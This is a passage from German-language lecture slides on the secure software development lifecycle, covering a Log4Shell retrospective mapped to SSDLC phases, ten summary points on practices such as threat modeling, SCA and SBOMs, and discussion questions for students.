**4. SBOM-basierte Inventarisierung:**
- Firmen mit SBOM konnten betroffene Systeme in Minuten identifizieren.
- Firmen ohne SBOM brauchten Wochen.

---

# Log4Shell: Der SSDLC-Rückblick

| SSDLC-Phase | Hätte geholfen durch... |
| :--- | :--- |
| **Requirements** | "Logging darf keinen Remote Code laden" |
| **Design** | Trust Boundary zwischen Logger und Netzwerk |
| **Implementierung** | Secure Defaults – JNDI-Lookups standardmäßig deaktiviert |
| **Testing (SCA)** | Verwundbare Log4j-Version in Abhängigkeiten erkannt |
| **SBOM** | Alle betroffenen Systeme in Minuten identifiziert |
| **DevSecOps** | Automatisierte SCA hätte bei jedem Build gewarnt |

> **Keine einzelne Maßnahme hätte ausgereicht.** Der SSDLC als System bietet **Defense in Depth** – mehrere Schutzschichten, die sich ergänzen.

---
<!-- _class: chapter -->

# Zusammenfassung & Diskussion

---

# Zusammenfassung: 10 Kernbotschaften

1. **SSDLC vs. SDLC:** Sicherheit ist kein Anhang, sondern integraler Kern.
2. **Shift Left:** Je früher ein Fehler gefunden wird, desto günstiger.
3. **Requirements:** Abuse Cases und Security DoD von Anfang an definieren.
4. **Design:** Threat Modeling mit STRIDE ist das Standard-Vorgehen.
5. **Implementierung:** OWASP Top 10 kennen – Injection, XSS, Broken Access Control.
6. **Testing:** SAST + DAST + SCA – automatisiert in der Pipeline.
7. **Supply Chain:** 80-90% Open-Source-Anteil – jede Abhängigkeit ist ein Risiko.
8. **SBOM:** Die "Zutatenliste" macht Software transparent und auditierbar.
9. **DevSecOps:** Security als Code – automatisiert, bei jedem Commit.
10. **Log4Shell:** Zeigt, dass eine *transitive Abhängigkeit* alles kompromittieren kann.

---

# Diskussionsfragen

1. **Realität vs. Theorie:** Ein kritisches Feature wird am Freitag um 17 Uhr fertig. Der SAST-Scan zeigt 3 "Medium"-Findings. Der Projektleiter sagt: *"Wir shippen trotzdem."* – Was tun Sie?

2. **Verantwortung:** Ein Open-Source-Maintainer pflegt eine Library, die in tausenden Produkten steckt – unbezahlt, in seiner Freizeit. Ein Bug verursacht Millionenschäden. Wer trägt die Verantwortung?

3. **KI & SSDLC:** Wie verändert KI-generierter Code (GitHub Copilot, ChatGPT) den SSDLC? Brauchen wir neue Phasen oder Tools?

4. **Kosten vs. Nutzen:** *"100% Sicherheit ist unerreichbar."* – Wie bestimmen Sie, wann ein Produkt "sicher genug" ist?

---

<style scoped>
h1 { font-size: 60pt; }
h2 { font-size: 40pt; }
</style>

# Und nächstes Mal...

## Netzwerksicherheit
